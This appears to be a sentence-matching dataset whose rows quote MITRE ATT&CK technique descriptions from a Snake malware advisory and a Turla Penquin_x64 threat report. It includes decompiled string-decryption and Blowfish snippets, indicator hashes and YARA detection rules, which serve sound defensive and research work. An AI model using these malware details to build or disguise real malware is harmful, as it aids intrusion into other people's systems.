adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol. adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol.,adversaries may execute their own malicious payloads by side- dll side-loading t1574.002 loading dlls. adversaries may compromise third-party infrastructure that can compromise infrastructure t1584 be used during targeting.,66f55ee03063d294857001f7,4519,0.8832412576814094
penquin can encrypt communications using the blowfish algorithm and a symmetric key exchanged with diffie hellman.,"for example, one of the features that remained unchanged among all the three malware sets is related to the encryption algorithm used to obfuscate the strings included in the binary. this kind of technique is also peculiar of other tools used by turla: index = 0; do{ _decrypted__buffer[index] = _xored__buffer[index] ^ (index + 0x5); ++index; } while ( index <= _xored__buffer_size); another commonality of the three sets is related to the encryption algorithm used to communicate through the network.","indeed, all the communications are encrypted with the blowfish algorithm, and a symmetric key exchanged with diffie hellman.","furthermore, the values that are used for the initialisation vector are always the same. int __cdecl bf_crypt(int len, int a2, int key, int a4) { int iv; // eax int num = 0; // [esp+20h] [ebp-8h] if ( a4 ) iv = key + 0x386c; else iv = key + 0x3864; bf_ofb64_encrypt((_byte *)a2, (_byte *)a2, len, key + 10268, iv, &num); return len; } © copyright leonardo s.p.a. – all rights reserved 11 company general usemalware technical insight: turla “penquin_x64” commonalities are more noticeable when considering the set of commands they can receive from the network, and the corresponding binary code to handle and execute them.",66f55ed73063d294857001f6,3811,0.7974929937442419
"once established within a system or network, an adversary may use automated techniques for collecting internal data.","adversaries may interact with the native os application native api t1106 programming interface (api) to execute behaviors. adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.","once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data.",adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect. adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect.,66f55ee03063d294857001f7,4502,0.8575362542264331
"adversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,"adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system. to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies.",66f55ee03063d294857001f7,4495,0.7634293552296757
adversaries may compromise third-party infrastructure that can be used during targeting.,adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol. adversaries may execute their own malicious payloads by side- dll side-loading t1574.002 loading dlls.,adversaries may compromise third-party infrastructure that can compromise infrastructure t1584 be used during targeting.,adversaries may develop malware and malware components that malware t1587.001 can be used during targeting. page 46 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may buy and/or steal capabilities that can be used obtain capabilities t1588 during targeting.,66f55ee03063d294857001f7,4521,0.8548206454130325
adversaries may execute their own malicious payloads by side-loading dlls.,adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol.,adversaries may execute their own malicious payloads by side- dll side-loading t1574.002 loading dlls.,adversaries may compromise third-party infrastructure that can compromise infrastructure t1584 be used during targeting. adversaries may develop malware and malware components that malware t1587.001 can be used during targeting.,66f55ee03063d294857001f7,4520,0.8133249076961309
adversaries may communicate using the domain name system  application layer protocol to avoid detection/network filtering by blending in with existing traffic.,adversaries may log user keystrokes to intercept credentials as keylogging t1056.001 the user types them. adversaries may abuse powershell commands and scripts for powershell t1059.001 execution.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4490,0.7907935860425115
adversaries may communicate using the domain name system  application layer protocol to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic.,"page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration. adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",66f55ee03063d294857001f7,4493,0.8055317094056366
adversaries may encode data to make the content of command and control traffic more difficult to detect.,"adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution. once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data.",adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.,adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect. adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement.,66f55ee03063d294857001f7,4503,0.8632425475526138
adversaries may obfuscate command and control traffic to make it more difficult to detect.,this report references the following mitre att&ck techniques. technique title id use network connection adversaries may perform network connection enumeration to t0840 enumeration discover information about device communication patterns.,adversaries may obfuscate command and control traffic to make data obfuscation t1001 it more difficult to detect.,"adversaries may impersonate legitimate protocols or web service protocol impersonation t1001.003 traffic to disguise command and control activity and thwart analysis efforts. page 43 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may attempt to dump credentials to obtain account os credential dumping t1003 login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.",66f55ee03063d294857001f7,4478,0.8325541892345095
"adversaries may obtain and abuse credentials of a default account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,"adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system. to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies.",66f55ee03063d294857001f7,4495,0.7597581055316641
adversaries may use obfuscated files or information to hide artifacts of an intrusion from analysis.,adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect. adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement.,deobfuscate/decode files adversaries may use obfuscated files or information to hide t1140 or information artifacts of an intrusion from analysis.,exploit public-facing adversaries may attempt to exploit a weakness in an internet- t1190 application facing host or system to initially access a network. page 45 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may attempt to gather information on domain trust domain trust discovery t1482 relationships that may be used to identify lateral movement opportunities in windows multi-domain/forest environments.,66f55ee03063d294857001f7,4506,0.7836481359076007
adversaries may deploy a container into an environment to facilitate execution or evade defenses.,"page 46 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may buy and/or steal capabilities that can be used obtain capabilities t1588 during targeting. adversaries may upload, install, or otherwise set up capabilities stage capabilities t1608 that can be used during targeting.",adversaries may deploy a container into an environment to deploy container t1610 facilitate execution or evade defenses.,"volatility plugin the following plugin for the volatility memory analysis framework will scan all processes on the system until it finds the snake user mode component injected into a process. if found, the plugin will list both the injected process and the virtual memory address at which the snake user mode component is loaded.",66f55ee03063d294857001f7,4525,0.8848691783610817
"adversaries may obtain and abuse credentials of a domain account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,"adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system. to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies.",66f55ee03063d294857001f7,4495,0.7682895876915388
adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in windows multi-domain/forest environments.,deobfuscate/decode files adversaries may use obfuscated files or information to hide t1140 or information artifacts of an intrusion from analysis. exploit public-facing adversaries may attempt to exploit a weakness in an internet- t1190 application facing host or system to initially access a network.,page 45 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may attempt to gather information on domain trust domain trust discovery t1482 relationships that may be used to identify lateral movement opportunities in windows multi-domain/forest environments.,adversaries may establish persistence and elevate privileges by installer packages t1546.016 using an installer to trigger the execution of malicious content. adversaries may execute their own malicious payloads by dynamic linker hijacking t1547.006 hijacking environment variables the dynamic linker uses to load shared libraries.,66f55ee03063d294857001f7,4508,0.7409641706541119
adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries.,page 45 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may attempt to gather information on domain trust domain trust discovery t1482 relationships that may be used to identify lateral movement opportunities in windows multi-domain/forest environments. adversaries may establish persistence and elevate privileges by installer packages t1546.016 using an installer to trigger the execution of malicious content.,adversaries may execute their own malicious payloads by dynamic linker hijacking t1547.006 hijacking environment variables the dynamic linker uses to load shared libraries.,inter-process adversaries may abuse inter-process communication (ipc) t1559 communication mechanisms for local code or command execution. an adversary may compress and/or encrypt data that is collected archive collected data t1560.003 prior to exfiltration.,66f55ee03063d294857001f7,4510,0.8768478293590378
adversaries may inject dynamic-link libraries  into processes in order to evade process-based defenses as well as possibly elevate privileges.,"adversaries may sniff network traffic to capture information about network sniffing t1040 an environment, including authentication material passed over the network. adversaries may attempt to get a listing of services running on network service discovery t1046 remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation.",adversaries may inject dynamic-link libraries (dlls) into dynamic-link library t1055.001 processes in order to evade process-based defenses as well as injection possibly elevate privileges.,adversaries may log user keystrokes to intercept credentials as keylogging t1056.001 the user types them. adversaries may abuse powershell commands and scripts for powershell t1059.001 execution.,66f55ee03063d294857001f7,4487,0.8246106417634387
adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may transfer tools or other files between systems in lateral tool transfer t1570 a compromised environment. adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid protocol tunneling t1572 detection/network filtering and/or enable access to otherwise unreachable systems.,adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol.,66f55ee03063d294857001f7,4517,0.9198779476609189
adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid protocol tunneling t1572 detection/network filtering and/or enable access to otherwise unreachable systems. adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol. adversaries may execute their own malicious payloads by side- dll side-loading t1574.002 loading dlls.,66f55ee03063d294857001f7,4518,0.7801656360534421
adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol. adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol.,adversaries may execute their own malicious payloads by side- dll side-loading t1574.002 loading dlls. adversaries may compromise third-party infrastructure that can compromise infrastructure t1584 be used during targeting.,66f55ee03063d294857001f7,4519,0.779828764726544
"despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.","a simple scheme, such as protocol xor-ing the plaintext with a fixed key, will produce a very weak ciphertext. © copyright leonardo s.p.a. – all rights reserved 23 company general usemalware technical insight: turla “penquin_x64” t1032 standard adversaries may explicitly employ a known encryption algorithm to cryptographic conceal command and control traffic rather than relying on any protocol inherent protections provided by a communication protocol.","despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.","t1158 hidden files to prevent normal users from accidentally changing special files on and directories a system, most operating systems have the concept of a ‘hidden’ file. these files don’t show up when a user browses the file system with a gui or when using normal commands on the command line.",66f55ed73063d294857001f6,3951,0.9618427515840351
adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic.,adversaries may log user keystrokes to intercept credentials as keylogging t1056.001 the user types them. adversaries may abuse powershell commands and scripts for powershell t1059.001 execution.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4490,0.753460821091465
adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic.,adversaries may abuse powershell commands and scripts for powershell t1059.001 execution. adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4491,0.7787984064461304
adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,66f55ee03063d294857001f7,4492,0.7095911597345619
adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.,"page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration. adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system.,"to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies. adversaries may use an osi non-application layer protocol for non-application layer t1095 communication between host and c2 server or among infected protocol hosts within a network.",66f55ee03063d294857001f7,4496,0.8637171882937437
"file and directory acl implementations vary by platform, but generally explicitly designate which users or groups can perform which actions .",users must explicitly ask to show the hidden files either via a series of graphical user interface (gui) prompts or with command line switches (dir /a for windows and ls –a for linux and macos). t1222 file and file and directory permissions are commonly managed by directory discretionary access control lists (dacls) specified by the file or permissions directory owner.,"file and directory dacl implementations may vary modification by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.).","© copyright leonardo s.p.a. – all rights reserved 24 company general usemalware technical insight: turla “penquin_x64” 7. indicators of compromise hashes 1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905 8dc3d053e5008ab92a17dc47fed43213a9873db0 0994d9deb50352e76b0322f48ee576c6 3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4 04686b0d2fdafa7cb6c17adc551abade334d7b85 14ecd5e6fc8e501037b54ca263896a11 8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667 7f043eb95d74d051ac780aee52ebf1c497c43060 19fbd8cbfb12482e8020a887d6427315 2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08 4594453e2e4002101481dc44f203d3ffebe079ae edf900cebb70c6d1fcab0234062bfc28 5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8 09580f1deb096bb50d082bd169271d41756adf73 ea06b213d5924de65407e8931b1e4326 d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0 9d133d7e0616573a7d1c822cc878149e7aa7bad6 e079ec947d3d4dacb21e993b760a65dc 8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc 0675329cfa4d13ee35f74c1cc236bc630b7de464 ad6731c123c4806f91e1327f35194722 67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502 f5a1a9180913bbeb1641af48660fbb756325f91e b4587870ecf51e8ef67d98bb83bc4be7 d9f2467ff11efae921ec83e074e4f8d2eac7881d76bff60a872a801bd45ce3d5 c67abb20ae5100f12ce084279827632fdbcb222a 7533ef5300263eec3a677b3f0636ae73 © copyright leonardo s.p.a. – all rights reserved 25 company general usemalware technical insight: turla “penquin_x64” yara rules rule apt_mal_lnx_turla_apr202004_1 { meta: description = ""detects turla linux malware x64 x32"" date = ""2020-04-24"" hash1 = ""67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502"" hash2 = ""8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc"" hash3 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash4 = ""1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905"" hash5 = ""2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08"" hash6 = ""3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4"" hash7 = ""5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8"" hash8 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash9 = ""d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0"" strings: $s1 = ""/root/.hsperfdata"" ascii fullword $s2 = ""desc| filename | size |state|"" ascii fullword $s3 = ""vs filesystem: %s"" ascii fullword $s4 = ""file already exist on remote filesystem !"" ascii fullword $s5 = ""/tmp/.sync.pid"" ascii fullword $s6 = ""rem_fd: ssl "" ascii fullword $s7 = ""trex_pid=%u"" ascii fullword $s8 = ""/tmp/.xdfg"" ascii fullword $s9 = ""__we_are_happy__"" ascii fullword $s10 = ""/root/.sess"" ascii fullword $s11 = ""zyszlrts^z@@nm@@g_y_fe"" ascii fullword condition: uint16(0) == 0x457f and filesize < 5000kb and 4 of them } © copyright leonardo s.p.a. – all rights reserved 26 company general usemalware technical insight: turla “penquin_x64” rule apt_mal_lnx_turla_apr202004_1_opcode { meta: description = ""detects turla linux malware x64 x32"" date = ""2020-04-24"" hash1 = ""67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502"" hash2 = ""8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc"" hash3 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash4 = ""1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905"" hash5 = ""2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08"" hash6 = ""3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4"" hash7 = ""5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8"" hash8 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash9 = ""d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0"" strings: $op0 = { 8d 41 05 32 06 48 ff c6 88 81 e0 80 69 00 } /* xor string loop_p1 x32*/ $op1 = { 48 ff c1 48 83 f9 49 75 e9 } /* xor string loop_p2 x32*/ $op2 = { c7 05 9b 7d 29 00 1d 00 00 00 c7 05 2d 7b 29 00 65 74 68 30 c6 05 2a 7b 29 00 00 e8 } /* load eth0 interface*/ $op3 = { bf ff ff ff ff e8 96 9d 0a 00 90 90 90 90 90 90 90 90 90 90 89 f0} /* opcode exceptions*/ $op4 = { 88 d3 80 c3 05 32 9a c1 d6 0c 08 88 9a 60 a1 0f 08 42 83 fa 08 76 e9 } /* xor string loop x64*/ $op5 = { 8b 8d 50 df ff ff b8 09 00 00 00 89 44 24 04 89 0c 24 e8 dd e5 02 00 } /* kill call x32 */ $op6 = { 8d 5a 05 32 9a 60 26 0c 08 88 9a 20 f4 0e 08 42 83 fa 48 76 eb } /* decrypt init str */ $op7 = { 8d 4a 05 32 8a 25 26 0c 08 88 8a 20 f4 0e 08 42 83 fa 08 76 eb} /* decrypt init str */ condition: uint16(0) == 0x457f and filesize < 5000kb and 2 of them } © copyright leonardo s.p.a. – all rights reserved 27 company general usemalware technical insight: turla “penquin_x64” references [1] the ‘penquin’ turla: a turla/snake/uroburos malware for linux; by kurt baumgartner, costin raiu.",66f55ed73063d294857001f6,3956,0.7461765736698388
"to prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file.","© copyright leonardo s.p.a. – all rights reserved 23 company general usemalware technical insight: turla “penquin_x64” t1032 standard adversaries may explicitly employ a known encryption algorithm to cryptographic conceal command and control traffic rather than relying on any protocol inherent protections provided by a communication protocol. despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.","t1158 hidden files to prevent normal users from accidentally changing special files on and directories a system, most operating systems have the concept of a ‘hidden’ file.",these files don’t show up when a user browses the file system with a gui or when using normal commands on the command line. users must explicitly ask to show the hidden files either via a series of graphical user interface (gui) prompts or with command line switches (dir /a for windows and ls –a for linux and macos).,66f55ed73063d294857001f6,3952,0.8910759903022774
these files don’t show up when a user browses the file system with a gui or when using normal commands on the command line.,"despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files. t1158 hidden files to prevent normal users from accidentally changing special files on and directories a system, most operating systems have the concept of a ‘hidden’ file.",these files don’t show up when a user browses the file system with a gui or when using normal commands on the command line.,users must explicitly ask to show the hidden files either via a series of graphical user interface (gui) prompts or with command line switches (dir /a for windows and ls –a for linux and macos). t1222 file and file and directory permissions are commonly managed by directory discretionary access control lists (dacls) specified by the file or permissions directory owner.,66f55ed73063d294857001f6,3953,1.0000000000000002
users must explicitly ask to show the hidden files either via a series of graphical user interface  prompts or with command line switches .,"t1158 hidden files to prevent normal users from accidentally changing special files on and directories a system, most operating systems have the concept of a ‘hidden’ file. these files don’t show up when a user browses the file system with a gui or when using normal commands on the command line.",users must explicitly ask to show the hidden files either via a series of graphical user interface (gui) prompts or with command line switches (dir /a for windows and ls –a for linux and macos).,"t1222 file and file and directory permissions are commonly managed by directory discretionary access control lists (dacls) specified by the file or permissions directory owner. file and directory dacl implementations may vary modification by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.).",66f55ed73063d294857001f6,3954,0.8375103190039458
adversaries may attempt to hide artifacts associated with their behaviors to evade detection.,inter-process adversaries may abuse inter-process communication (ipc) t1559 communication mechanisms for local code or command execution. an adversary may compress and/or encrypt data that is collected archive collected data t1560.003 prior to exfiltration.,adversaries may attempt to hide artifacts associated with their hide artifacts t1564 behaviors to evade detection.,adversaries may abuse the windows service control manager to service execution t1569.002 execute malicious commands or payloads. adversaries may transfer tools or other files between systems in lateral tool transfer t1570 a compromised environment.,66f55ee03063d294857001f7,4513,0.875999800224953
files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as ftp.,"after the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. t1105 remote file files may be copied from one system to another to stage adversary copy tools or other files over the course of an operation.",files may be copied from an external adversary-controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as ftp.,"files can also be copied over on mac and linux with native tools like scp, rsync, and sftp. t1094 custom adversaries may communicate using a custom command and command and control protocol instead of encapsulating commands/data in an control protocol existing standard application layer protocol.",66f55ed73063d294857001f6,3944,1.0
"files can also be copied over on mac and linux with native tools like scp, rsync, and sftp.",t1105 remote file files may be copied from one system to another to stage adversary copy tools or other files over the course of an operation. files may be copied from an external adversary-controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as ftp.,"files can also be copied over on mac and linux with native tools like scp, rsync, and sftp.",t1094 custom adversaries may communicate using a custom command and command and control protocol instead of encapsulating commands/data in an control protocol existing standard application layer protocol. implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by tcp/ip/another standard network stack.,66f55ed73063d294857001f6,3945,1.0
adversaries may abuse inter-process communication  mechanisms for local code or command execution.,adversaries may establish persistence and elevate privileges by installer packages t1546.016 using an installer to trigger the execution of malicious content. adversaries may execute their own malicious payloads by dynamic linker hijacking t1547.006 hijacking environment variables the dynamic linker uses to load shared libraries.,inter-process adversaries may abuse inter-process communication (ipc) t1559 communication mechanisms for local code or command execution.,an adversary may compress and/or encrypt data that is collected archive collected data t1560.003 prior to exfiltration. adversaries may attempt to hide artifacts associated with their hide artifacts t1564 behaviors to evade detection.,66f55ee03063d294857001f7,4511,0.8510996488443444
adversaries may log user keystrokes to intercept credentials as the user types them.,"adversaries may attempt to get a listing of services running on network service discovery t1046 remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. adversaries may inject dynamic-link libraries (dlls) into dynamic-link library t1055.001 processes in order to evade process-based defenses as well as injection possibly elevate privileges.",adversaries may log user keystrokes to intercept credentials as keylogging t1056.001 the user types them.,adversaries may abuse powershell commands and scripts for powershell t1059.001 execution. adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4488,0.7871606202838792
adversaries may transfer tools or other files between systems in a compromised environment.,adversaries may attempt to hide artifacts associated with their hide artifacts t1564 behaviors to evade detection. adversaries may abuse the windows service control manager to service execution t1569.002 execute malicious commands or payloads.,adversaries may transfer tools or other files between systems in lateral tool transfer t1570 a compromised environment.,adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid protocol tunneling t1572 detection/network filtering and/or enable access to otherwise unreachable systems. adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.,66f55ee03063d294857001f7,4515,0.7976971315671642
files may be copied from one system to another to stage adversary tools or other files over the course of an operation.,"usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics. after the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.",t1105 remote file files may be copied from one system to another to stage adversary copy tools or other files over the course of an operation.,"files may be copied from an external adversary-controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as ftp. files can also be copied over on mac and linux with native tools like scp, rsync, and sftp.",66f55ed73063d294857001f6,3943,0.8536776428697389
